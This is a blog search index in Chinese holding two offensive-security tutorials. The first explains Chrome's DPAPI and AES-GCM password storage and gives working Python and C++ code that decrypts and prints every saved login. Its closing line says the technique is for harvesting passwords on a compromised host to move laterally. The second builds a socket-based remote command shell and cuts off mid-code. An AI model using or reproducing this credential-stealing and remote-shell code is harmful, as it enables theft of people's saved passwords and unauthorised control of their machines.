<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>使用c++抓取Chrome所有版本密码</title>
    <link href="/2021/06/20/CatchChrome/"/>
    <url>/2021/06/20/CatchChrome/</url>
    
    <content type="html"><![CDATA[<p>工具已上传到github:<a href="https://github.com/SD-XD/Catch-Browser">https://github.com/SD-XD/Catch-Browser</a></p><h2 id="谷歌浏览器存储密码的方式"><a href="#谷歌浏览器存储密码的方式" class="headerlink" title="谷歌浏览器存储密码的方式"></a>谷歌浏览器存储密码的方式</h2><p>在使用谷歌浏览器时,如果我们输入某个网站的账号密码,他会自动问我们是否要保存密码,以便下次登录的时候自动填写账号和密码<br><img src="/img/CatchChrome/1.png"></p><p>在设置中可以找到登录账户和密码</p><p><img src="/img/CatchChrome/2.png"></p><p>也可以直接看密码,不过需要凭证</p><p><img src="/img/CatchChrome/3.png"></p><p>这其实是windows的DPAPI机制</p><h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><p>Data Protection Application Programming Interface(数据保护API)</p><p>DPAPI是Windows系统级对数据进行加解密的一种接口无需自实现加解密代码微软已经提供了经过验证的高质量加解密算法提供了用户态的接口对密钥的推导存储数据加解密实现透明并提供较高的安全保证</p><p>DPAPI提供了两个用户态接口<code>CryptProtectData</code>加密数据<code>CryptUnprotectData</code>解密数据加密后的数据由应用程序负责安全存储应用无需解析加密后的数据格式。但是加密后的数据存储需要一定的机制因为该数据可以被其他任何进程用来解密当然<code>CryptProtectData</code>也提供了用户输入额外数据来参与对用户数据进行加密的参数但依然无法放于暴力破解。</p><p>微软提供了两个接口用来加密和解密,<code>CryptProtectMemory</code>和<code>CryptUnprotectMemory</code></p><p>实际上,在老版本(80之前)的谷歌浏览器,仅仅是使用了<code>CryptProtectMemory</code>来对密码进行加密</p><h2 id="80版本之前的Chrome"><a href="#80版本之前的Chrome" class="headerlink" title="80版本之前的Chrome"></a>80版本之前的Chrome</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>win7</li><li>Chrome版本 79.0.3945.117</li></ul><h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>chrome的密码经过加密后存储在</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%LocalAppData%</span><span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\U</span>ser Data<span class="hljs-symbol">\D</span>efault<span class="hljs-symbol">\L</span>ogin Data<br></code></pre></td></tr></table></figure><p>如果用二进制文本编辑器查看的化会发现他其实是一个sqlite数据库文件</p><p><img src="/img/CatchChrome/4.png"></p><p>可以使用工具SQLiteStudio打开他</p><p>双击logins</p><p><img src="/img/CatchChrome/5.png"></p><p>选择data<br><img src="/img/CatchChrome/6.png"></p><p>可以看到有用户名和网址,却没有密码</p><p>但是密码的二进制实际是有值的</p><p><img src="/img/CatchChrome/7.png"></p><h3 id="编写脚本解密"><a href="#编写脚本解密" class="headerlink" title="编写脚本解密"></a>编写脚本解密</h3><p>python的解密是最简洁的，这里送上一个三好学生的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> getenv<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> win32crypt<br><span class="hljs-keyword">import</span> binascii<br>conn = sqlite3.connect(getenv(<span class="hljs-string">&quot;APPDATA&quot;</span>) + <span class="hljs-string">&quot;\..\Local\Google\Chrome\User Data\Default\Login Data&quot;</span>)<br>cursor = conn.cursor()<br>cursor.execute(<span class="hljs-string">&#x27;SELECT action_url, username_value, password_value FROM logins&#x27;</span>)<br><span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> cursor.fetchall():<br>    password = win32crypt.CryptUnprotectData(result[<span class="hljs-number">2</span>], <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-number">0</span>)[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> password:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Site: &#x27;</span> + result[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Username: &#x27;</span> + result[<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Password: &#x27;</span> + password<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;no password found&quot;</span><br></code></pre></td></tr></table></figure><p>但我还是想c++写一个</p><p>编写之前,需要配置sqlite3环境,并且下载<code>&lt;sqlite3.h&gt;</code>和<code>&lt;sqlite3.c&gt;</code>文件</p><p>如果当前用户正在使用谷歌,是无法打开数据库的,于是我们可以复制一份出来操作</p><p><img src="/img/CatchChrome/8.png"></p><p>再通过sql语句查找logins表</p><p><img src="/img/CatchChrome/9.png"></p><p>在回调函数中解密</p><p><img src="/img/CatchChrome/10.png"></p><p>看下效果,完美解出密码</p><p><img src="/img/CatchChrome/11.png"></p><p>与谷歌浏览器上面看到的也是一样的,无需再验证用户密码</p><p><img src="/img/CatchChrome/12.png"></p><h2 id="80版本之后的Chrome"><a href="#80版本之后的Chrome" class="headerlink" title="80版本之后的Chrome"></a>80版本之后的Chrome</h2><p>那么80.x之后的Chrome如何解密呢</p><h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>win10</li><li>Chrome版本 91.0.4472.101(最新版)</li></ul><h3 id="实验分析"><a href="#实验分析" class="headerlink" title="实验分析"></a>实验分析</h3><p>先看一下跟以前版本的Chrome存储方式上有什么区别</p><p><img src="/img/CatchChrome/13.png"></p><p><img src="/img/CatchChrome/14.png"></p><p>判断是否是新版本的Chrome加密其实就是看它加密后值的前面有没有v10或者v11</p><p>看官方文档,分析新版加密算法</p><p>key的初始化<br><a href="https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=192;drc=f59fc2f1cf0efae49ea96f9070bead4991f53fea">https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;l=192;drc=f59fc2f1cf0efae49ea96f9070bead4991f53fea</a></p><p><img src="/img/CatchChrome/15.png"></p><p><img src="/img/CatchChrome/16.png"><br>注释:尝试从local state提取密钥。</p><p>并且可以看到<code>kDPAPIKeyPrefix</code>实际上就是一个字符串”DPAPI”</p><p><img src="/img/CatchChrome/17.png"></p><p>然后就是进行DPAPI的解密,最后就是如果key不在local state中或者DPAPI解密失败,就重新生成一个key</p><p>从这里我们我可以大致分析出key初始化时的动作:</p><ol><li>从local state文件中提取key</li><li>base64解密key</li><li>去除key开头的“DPAPI”</li><li>DPAPI解密,得到最终的key</li></ol><p>跟进<code>GetString</code>函数的参数<code>kOsCryptEncryptedKeyPrefName</code></p><p><img src="/img/CatchChrome/18.png"></p><p>知道key存放在local state文件os_crypt.encrypted_key字段中,即</p><p><img src="/img/CatchChrome/19.png"></p><p>而local state文件就在本地默认目录:</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%LocalAppData%</span><span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\U</span>ser Data<span class="hljs-symbol">\L</span>ocal State<br></code></pre></td></tr></table></figure><p>Local State是一个JSON格式的文件</p><h3 id="明文加密方式"><a href="#明文加密方式" class="headerlink" title="明文加密方式"></a>明文加密方式</h3><p>看源码注释</p><p><img src="/img/CatchChrome/20.png"></p><p>密钥加密后数据前缀是“v10”</p><p><img src="/img/CatchChrome/21.png"></p><p>密钥和NONCE/IV的长度分别为：32字节和12字节</p><p><img src="/img/CatchChrome/22.png"></p><p>这里解释一下NONCE/IV是什么:</p><p>如果我们不希望相同的明文通过密钥加密出来的密文是相同的(这样很容易让攻击者知道这两条密文的明文是相同的) 解决办法是使用IV（初始向量）或nonce（只使用一次的数值）。因为对于每条加密消息，我们都可以使用不同的byte字符串。它们是非确定理论的起源，而这种理论要求制造出令人难以分辨的副本。这些消息通常不是什么秘密，但为了解密需要，我们会在分发时对它们进行加密。 IV与nonce之间的区别是有争议的，但也不是没有关联的。不同的加密方案所保护的侧重点也不同：有些方案需要的只是密文不重复，这种情况我们通常叫作nonce；还有一些方案需要密文是随机的，甚至完全不可预测的，这种情况我们通常叫作IV。这里其实就是希望即便明文相同,经过加密后的密文也不相同。</p><p>再往下翻,其实可以看到解密函数</p><p><img src="/img/CatchChrome/23.png"></p><p><code>encrypted_value</code>的前缀v10后为12字节的NONCE（IV），然后再是真正的密文。Chrome使用的是AES-256-GCM的AEAD对称加密、</p><p>那么思路就清晰了,这里我自己画了一个图来总结算法</p><p><img src="/img/CatchChrome/24.png"></p><p>实现自动化抓密码<br>解密使用一个非常强大的库,cryptopp</p><p>先获取原始的key</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">string <span class="hljs-title">GetOriginalkey</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string Decoded = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//获取Local State中的未解密的key</span><br>    string key = <span class="hljs-string">&quot;RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAADWXmStECIlTZZxWMAYf5UmAAAAAAIAAAAAABBmAAAAAQAAIAAAAP8V1h3J1qhEf8/h13hre+e3EMW0oD41Ux7UrEqls4DoAAAAAA6AAAAAAgAAIAAAAA7xXGgN1Hks1TbInimvYa0TnMfPa0jPpmlI9BDiUQAAMAAAAPzO7wya37iu97rDB4UTtn5QwQcuJkw2E3cw/tHuSnHdNv4qwXMWLC2oU3TkysoXmUAAAAAtPkLwNaInulyoGNH4GDxlwbzAW4DP7T8XWsZ/2QB0YrcLqxSNytHlV1qvVyO8D20Eu7jKqD/bMW2MzwEa40iF&quot;</span>;<br>    <span class="hljs-built_in">StringSource</span>((BYTE*)key.<span class="hljs-built_in">c_str</span>(), key.<span class="hljs-built_in">size</span>(), <span class="hljs-literal">true</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Base64Decoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(Decoded)));<br>    key = Decoded;<br>    key = key.<span class="hljs-built_in">substr</span>(<span class="hljs-number">5</span>);<span class="hljs-comment">//去除首位5个字符DPAPI</span><br>    Decoded.<span class="hljs-built_in">clear</span>();<span class="hljs-comment">//DPAPI解密</span><br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">char</span> result[<span class="hljs-number">1000</span>] = <span class="hljs-string">&quot;&quot;</span>;<br>    DATA_BLOB DataOut = &#123; <span class="hljs-number">0</span> &#125;;<br>    DATA_BLOB DataVerify = &#123; <span class="hljs-number">0</span> &#125;;<br>    DataOut.pbData = (BYTE*)key.<span class="hljs-built_in">c_str</span>();<br>    DataOut.cbData = <span class="hljs-number">1000</span>;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">CryptUnprotectData</span>(&amp;DataOut, <span class="hljs-literal">nullptr</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;DataVerify)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Decryption failure: %d\n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Decryption successfully!\n&quot;</span>);<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; DataVerify.cbData; i++)<br>        &#123;<br>            result[i] = DataVerify.pbData[i];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果当前chrome版本并不是80+,可以通过一个简单的判断:就是看加密密码前有没有”v10“或者”v11“</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++">string e_str = argv[<span class="hljs-number">2</span>];<br><span class="hljs-comment">//判断密文是否包含v10或v11,如果包含则说明是80+的Chrome,用新的解密方法</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(e_str.<span class="hljs-built_in">c_str</span>(), <span class="hljs-string">&quot;v10&quot;</span>) != <span class="hljs-literal">NULL</span> || <span class="hljs-built_in">strstr</span>(e_str.<span class="hljs-built_in">c_str</span>(), <span class="hljs-string">&quot;v11&quot;</span>) != <span class="hljs-literal">NULL</span>)<br>&#123;<br>    <span class="hljs-built_in">NewDecrypt</span>(argc, argv, azColName);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">DecryptoByDPAPI</span>(argv, azColName);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>然后就是解密密文</p><p>获取iv和密文</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//argv[2]是password_value的值</span><br>chiper = argv[<span class="hljs-number">2</span>];<br>iv = argv[<span class="hljs-number">2</span>];<br>iv = iv.<span class="hljs-built_in">substr</span>(<span class="hljs-number">3</span>, <span class="hljs-number">15</span>);  <span class="hljs-comment">//获取iv的值</span><br>chiper = chiper.<span class="hljs-built_in">substr</span>(<span class="hljs-number">15</span>);   <span class="hljs-comment">//加密密码的值</span><br></code></pre></td></tr></table></figure><p>再用<code>cyptopp</code>强大的库函数进行解密</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//获取iv hex编码值</span><br><span class="hljs-built_in">StringSource</span>((BYTE*)iv.<span class="hljs-built_in">c_str</span>(), iv.<span class="hljs-built_in">size</span>(), <span class="hljs-literal">true</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">HexEncoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(Encoded)));<br>iv = Encoded;<br>Encoded.<span class="hljs-built_in">clear</span>();<br>iv = iv.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>, iv.<span class="hljs-built_in">size</span>() - <span class="hljs-number">6</span>);<br>CHAR Pass_Word[<span class="hljs-number">1000</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-built_in">StringSource</span>((BYTE*)iv.<span class="hljs-built_in">c_str</span>(), iv.<span class="hljs-built_in">size</span>(), <span class="hljs-literal">true</span>,<span class="hljs-keyword">new</span> <span class="hljs-built_in">HexDecoder</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(Decoded))); <br>iv = Decoded;<br>Decoded.<span class="hljs-built_in">clear</span>();<br><span class="hljs-keyword">char</span>* key = <span class="hljs-built_in">GetOriginalkey</span>();<br>d.<span class="hljs-built_in">SetKeyWithIV</span>((BYTE*)key, <span class="hljs-number">32</span>, (BYTE*)iv.<span class="hljs-built_in">c_str</span>(), iv.<span class="hljs-built_in">size</span>());<br><br><span class="hljs-built_in">StringSource</span>(chiper, <span class="hljs-literal">true</span>,<span class="hljs-keyword">new</span> <span class="hljs-built_in">AuthenticatedDecryptionFilter</span>(d,<span class="hljs-keyword">new</span> <span class="hljs-built_in">StringSink</span>(password)));<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; password.<span class="hljs-built_in">size</span>(); i++)<br>&#123;<br>    Pass_Word[i] = password[i];<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s = %s\n&quot;</span>, azColName[<span class="hljs-number">0</span>], argv[<span class="hljs-number">0</span>] ? argv[<span class="hljs-number">0</span>] : <span class="hljs-string">&quot;NULL&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s = %s\n&quot;</span>, azColName[<span class="hljs-number">1</span>], argv[<span class="hljs-number">1</span>] ? argv[<span class="hljs-number">1</span>] : <span class="hljs-string">&quot;NULL&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s = %s\n&quot;</span>, azColName[<span class="hljs-number">2</span>], Pass_Word);<br></code></pre></td></tr></table></figure><p>这里逻辑的话参照上面分析步骤,这里就不再赘述</p><p>最后看看解密效果<br><img src="/img/CatchChrome/25.png"></p><p><img src="/img/CatchChrome/26.png"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>实战中如果拿到一台主机,并且安装有chrome,我们就可以抓取密码以便快速精确地横向。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>socket之shell实现</title>
    <link href="/2021/06/20/RemoteCmd/"/>
    <url>/2021/06/20/RemoteCmd/</url>
    
    <content type="html"><![CDATA[<h2 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h2><p>Socket中文为”套接字”,实际上是windows的API,程序员无需知道<code>TCP/IP</code>的细节可直接调用网络编程接口,Socket中有两种通信协议可供选择</p><ul><li>TCP</li><li>UDP<br>TCP是安全的,在传输数据前必须建立连接,这个连接实际上是三次握手;UDP则是不安全的,但是他的效率是比TCP要高的,QQ实际上就是使用UDP协议<br>思路是非常简单的</li></ul><ol><li>Socket建立通信</li><li>客户端执行命令并返回结果<h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2></li></ol><p>服务端(监听端):<br>服务器端初始化<code>Winsock</code>环境后，便调用Socket丽数创建流式套接字;然后对<code>sockadd_in</code>结构体进行设置，设置服务器绑定的IP地址和端口等信息并调用<code>bind</code>函数来绑定;绑定成功后，就可以调用<code>listen</code>函数设置连接数量，并进行监听。直到有来自客户端的连接请求，服务器便调用<code>accept</code>函数接受连接请求，建立连接。这时，可以使用<code>recv</code>函数和<code>send</code>函数与客户端进行数据收发</p><p>客户端(接收端):<br>客户端初始化环境后,便调用Socket函数创建流式套接字;然后对<code>sockaddr_in</code>结构体进行设置，设置服务器的IP地址和端口等信息并调用<code>connect</code>函数向服务器发送连接请求，并等待服务器响应。服务器接受连接请求后，就成功地与服务器建立连接，这时，可以使用<code>recv</code>函数和<code>send</code>函数与客户端进行数据收发。</p><p>为了方便理解画一个图<br><img src="/img/socket/1.png"></p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>创建一个函数,实现服务端的winsock初始化,创建流式socket,绑定服务端地址和端口和监听</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">SocketListen</span><span class="hljs-params">(LPSTR ipaddr,<span class="hljs-keyword">int</span> port)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//初始化winsock环境</span><br>    WSADATA wsadata = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsadata) == SOCKET_ERROR) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Failed to initialize Winsock character environment..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//创建流式socket</span><br>    g_SeverSocket = <span class="hljs-built_in">socket</span>(AF_INET,SOCK_STREAM,<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (g_SeverSocket == INVALID_SOCKET)<br>    &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Socket Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置服务端地址和端口</span><br>    sockaddr_in ServerAddr;<br>    ServerAddr.sin_family = AF_INET;<br>    ServerAddr.sin_port = ::<span class="hljs-built_in">htons</span>(port);<br>    ServerAddr.sin_addr.S_un.S_addr = ::<span class="hljs-built_in">inet_addr</span>(ipaddr);<br>    <span class="hljs-comment">//绑定端口ip</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != ::<span class="hljs-built_in">bind</span>(g_SeverSocket, (LPSOCKADDR)&amp;ServerAddr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(ServerAddr))) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] bind Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置监听,参数:已捆绑未连接的套接字描述字，正在等待连接的最大队列长度</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != ::<span class="hljs-built_in">listen</span>(g_SeverSocket, <span class="hljs-number">1</span>)) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] listen Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>再等待客户端的连接,如果<code>accept</code>到一个客户端,就让用户在命令行输入命令,并将命令发送给客户端。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">VOID <span class="hljs-title">AcceptRecvMsg</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    sockaddr_in addr = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(addr);<br>    <span class="hljs-comment">//接收客户端请求</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] Wait a Client connect..\n&quot;</span>;<br>    g_ClientSocket = ::<span class="hljs-built_in">accept</span>(g_SeverSocket, (LPSOCKADDR)&amp;addr, &amp;len);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] a Client connect..\n&quot;</span>;<br>    <span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">while</span> (TRUE)<br>    &#123;<br>        <span class="hljs-comment">//接收用户输入并发送给客户端</span><br>        <span class="hljs-built_in">SendCommand</span>();<br>        <span class="hljs-comment">//接收数据</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>        &#123;<br>            <span class="hljs-keyword">int</span> rRet = ::<span class="hljs-built_in">recv</span>(g_ClientSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span> (rRet &lt;= <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;[+] recv:\n&quot;</span> &lt;&lt; szBuffer &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <br>    &#125;<br>&#125;<br><br><span class="hljs-function">VOID <span class="hljs-title">SendCommand</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> cmd[<span class="hljs-number">20</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot; &gt;&quot;</span>;<br>    cin.<span class="hljs-built_in">getline</span>(cmd, <span class="hljs-number">20</span>);<br>    ::<span class="hljs-built_in">send</span>(g_ClientSocket, cmd, <span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(cmd), <span class="hljs-literal">NULL</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] sent:&quot;</span> &lt;&lt; cmd &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端只需要在初始化环境后与服务端<code>connect</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">connection</span><span class="hljs-params">(LPSTR ServerIP,<span class="hljs-keyword">int</span> ServerPort)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//初始化winsock环境</span><br>    WSADATA wsadata = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsadata) == SOCKET_ERROR) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Failed to initialize Winsock character environment..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//创建流式socket</span><br>    g_ClientSocket = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (g_ClientSocket == INVALID_SOCKET)<br>    &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Socket Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置服务端地址和端口</span><br>    sockaddr_in ServerAddr;<br>    ServerAddr.sin_family = AF_INET;<br>    ServerAddr.sin_port = ::<span 